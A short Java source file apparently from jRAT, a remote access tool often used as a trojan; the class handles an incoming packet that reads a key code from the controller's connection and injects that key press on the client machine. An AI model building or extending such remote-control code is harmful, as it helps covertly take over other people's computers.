package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.utils.ScreenUtils;
import jrat.common.utils.Utils;

public class Packet94KeyPress extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();

		if (!Utils.isHeadless()) {
			ScreenUtils.getDefault().keyPress(btn);
		}
	}

}
